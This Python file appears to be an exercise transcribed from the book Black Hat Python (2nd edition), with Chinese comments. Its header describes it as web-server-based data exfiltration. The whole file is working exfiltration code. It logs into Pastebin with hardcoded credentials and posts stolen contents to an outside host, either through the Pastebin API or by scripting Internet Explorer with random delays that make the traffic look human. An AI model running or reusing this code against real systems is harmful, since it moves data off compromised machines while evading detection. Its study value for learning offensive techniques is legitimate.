#!/usr/bin/env python
# encoding: utf-8
"""
@author: HuRuiFeng
@file: paste_exfil.py
@time: 2022/5/26 22:05
@project: black-hat-python-2ed
@desc: P172 基于Web服务器的数据渗透
"""
import random
import time

import requests
from win32com import client

username = "tim"
password = "seKret"
api_dev_key = "cd3xxx001xxxx02"


def plain_paste(title, contents):
    # 创建便签所需的凭证
    login_url = "https://pastebin.com/api/api_login.php"
    login_data = {
        'api_dev_key': api_dev_key,
        'api_user_name': username,
        'api_user_password': password
    }
    r = requests.post(login_url, data=login_data)
    api_user_key = r.text

    # 登录到Pastebin账号
    paste_url = "https://pastebin.com/api/api_post.php"
    paste_data = {
        'api_paste_name': title,
        'api_paste_code': contents.decode(),
        'api_dev_key': api_dev_key,
        'api_user_key': api_user_key,
        'api_option': 'paste',
        'api_paste_private': 0,
    }
    r = requests.post(paste_url, data=paste_data)
    print(r.status_code)
    print(r.text)


def wait_for_browser(browser):
    # 用来等待浏览器完成当前操作
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)


def random_sleep():
    # 让游览器的行为多一些随机性
    time.sleep(random.randint(5, 10))


def login(ie):
    # 读取DOM中的所有元素
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'loginform-username':
            elem.setAttribute('value', username)
        elif elem.id == 'loginform-password':
            elem.setAttribute('value', password)

    random_sleep()
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    wait_for_browser(ie)


def submit(ie, title, contents):
    # 获取标题和正文的输入框
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'postform-name':
            elem.setAttribute('value', title)
        elif elem.id == 'postform-text':
            elem.setAttribute('value', contents)

    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()

    random_sleep()
    wait_for_browser(ie)


def ie_paste(title, contents):
    # 创建一个IE浏览器COM对象的实例
    ie = client.Dispatch('InternetExplorer.Application')
    # 设定进程在屏幕上显示
    ie.Visible = 1

    ie.Navigate('https://pastebin.com/login')
    wait_for_browser(ie)
    login(ie)

    ie.Navigate('https://pastebin.com/')
    wait_for_browser(ie)
    submit(ie, title, contents.decode())

    # 关闭游览器实例
    ie.Quit()


if __name__ == '__main__':
    ie_paste('title', 'contents')
